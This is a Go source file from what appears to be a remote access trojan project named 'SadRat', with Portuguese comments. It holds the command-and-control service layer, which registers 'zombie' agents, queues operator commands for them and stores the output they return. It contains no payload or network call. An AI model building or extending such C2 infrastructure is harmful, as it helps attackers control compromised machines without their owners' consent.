package service

import (
	"github.com/VitorDie/SadRat/internal/domain"
	"github.com/google/uuid"
)

// ConcreteServer é a Camada de Serviço que guarda as regras de negócio do C&C
type ConcreteServer struct {
	db domain.ServerDB // Injeção de dependência do Banco de Dados
}

// NewConcreteServer constrói a regra de negócio injetando o repositório
func NewConcreteServer(db domain.ServerDB) *ConcreteServer {
	return &ConcreteServer{db: db}
}

// GiveAnUUIDForAgentRequest cria o ID do Zumbi, salva no banco e o retorna
func (s *ConcreteServer) GiveAnUUIDForAgentRequest() (string, error) {
	// 1. Regra de Negócio: Gerar um UUID único
	newUUID := uuid.NewString()

	// 2. Regra de Negócio: Transformar em Entidade do Domínio
	agentRow := domain.NewAgentRow(newUUID)

	// 3. Persistência: Chamar o banco de dados (que no teste é um Mock!)
	if err := s.db.SaveAgent(agentRow); err != nil {
		return "", err
	}

	// 4. Retorna a resposta limpa e agnóstica de rede
	return newUUID, nil
}

// SendAvailableAgents busca todos os zumbis registrados no banco e os retorna
func (s *ConcreteServer) SendAvailableAgents() ([]domain.AgentRow, error) {
	// A regra de negócio aqui delega a busca para a interface do Banco de Dados
	return s.db.GetAllAgents()
}

// ReceiveCommand recebe o comando do Operador, transforma em Entidade, salva e retorna o ID
func (s *ConcreteServer) ReceiveCommand(command string, args []string, agentID string) (string, error) {
	// 1. Regra de Negócio: Criamos a Entidade (que já gera o UUID do Job internamente)
	jobRow := domain.NewJobRow(agentID, command, args)

	// 2. Persistência: Injetamos o comando na fila do Banco de Dados
	if err := s.db.SaveJob(jobRow); err != nil {
		return "", err
	}

	// 3. Retornamos o ID do Job para o "Garçom" (HandlerHTTP) repassar ao Operador
	return jobRow.ID, nil
}

// SendJobs busca um comando pendente na fila para um Agente específico
func (s *ConcreteServer) SendJobs(agentID string) (domain.JobRow, error) {
	// A regra de negócio delega a busca para a interface do Banco de Dados
	return s.db.GetJobForAgent(agentID)
}

// ReceiveJobResult recebe o output do comando executado no zumbi e atualiza a entidade
func (s *ConcreteServer) ReceiveJobResult(jobID string, output string) error {
	// 1. Regra de Negócio: Buscamos a entidade atual no banco
	job, err := s.db.GetJob(jobID)
	if err != nil {
		return err // Retorna o erro e aborta se o Job não existir
	}

	// 2. Regra de Negócio: Atualizamos o Output do comando.
	// Como na sua struct o Output é um ponteiro (*string), usamos '&' para pegar o endereço da variável
	job.Output = &output

	// 3. Persistência: Salvamos a entidade atualizada de volta no banco
	return s.db.UpdateJob(job)
}

// SendJobResult busca um Job específico e retorna apenas a string com o output (para o Operador)
func (s *ConcreteServer) SendJobResult(jobID string) (string, error) {
	// 1. Regra de negócio: Buscar o Job na Camada de Repositório
	job, err := s.db.GetJob(jobID)
	if err != nil {
		return "", err
	}

	// 2. Regra de negócio: Extrair o resultado com segurança (lidando com o ponteiro)
	if job.Output == nil {
		return "", nil // Se o zumbi ainda não enviou o resultado, devolvemos uma string vazia
	}

	// Retorna o valor real da string desreferenciando o ponteiro
	return *job.Output, nil
}

func (s *ConcreteServer) SendAllJobResults() ([]domain.JobRow, error) {
	return nil, nil
}
